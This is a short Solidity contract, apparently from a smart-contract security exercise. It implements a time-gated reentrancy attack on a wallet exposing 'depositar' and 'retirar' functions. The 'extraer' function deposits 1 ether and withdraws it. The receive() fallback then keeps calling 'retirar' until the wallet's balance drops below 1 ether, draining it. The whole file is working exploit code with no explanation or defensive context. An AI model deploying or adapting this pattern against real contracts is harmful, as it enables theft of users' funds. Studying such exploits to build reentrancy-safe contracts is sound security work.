// SPDX-License-Identifier: MPL-2.0
pragma solidity ^0.8.2;

interface IWallet {
    function depositar() external payable;

    function retirar() external;
}

contract TimedAttack {
    IWallet public immutable wallet;
    uint256 public endTime;

    constructor(IWallet _wallet) {
        wallet = _wallet;
    }

    function startTime() public {
        endTime = block.timestamp + 1 minutes;
    }

    function extraer() external payable {
        require(msg.value == 1 ether, "ETH INSUFICIENTE");
        require(
            block.timestamp < endTime,
            "No esta habilitado el tiempo de extraccion"
        );
        wallet.depositar{value: 1 ether}();
        wallet.retirar();
    }

    receive() external payable {
        if (address(wallet).balance >= 1 ether) {
            wallet.retirar();
        }
    }

    function balance() external view returns (uint256) {
        require(endTime > block.timestamp, "ERROR.");
        return endTime - block.timestamp;
    }
}
